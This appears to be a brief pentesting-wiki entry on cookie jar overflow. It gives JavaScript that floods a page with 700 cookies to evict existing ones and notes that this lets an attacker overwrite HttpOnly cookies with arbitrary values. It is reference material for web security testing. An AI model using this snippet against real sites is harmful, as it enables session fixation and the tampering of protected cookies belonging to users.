Browsers have a limit on the number of cookies they can store for a page. This allows you to supplant cookies by adding new ones:

```javascript
// Set many cookies
for (let i = 0; i < 700; i++) {
    document.cookie = `cookie${i}=${i}; Secure`;
}

// Remove all cookies
for (let i = 0; i < 700; i++) {
    document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
}
```

{% hint style="info" %}
Third-party cookies pointing to a different domain will not be overwritten
{% endhint %}

Cookie jar overflow can be used for overwrite `HttpOnly` cookies, so you can remove them and reset with an arbitrary value.

# References

- [HackTricks: Cookie Jar Overflow](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies/cookie-jar-overflow)
- [Overwriting HttpOnly cookies using cookie jar overflow](https://www.sjoerdlangkemper.nl/2020/05/27/overwriting-httponly-cookies-from-javascript-using-cookie-jar-overflow/)
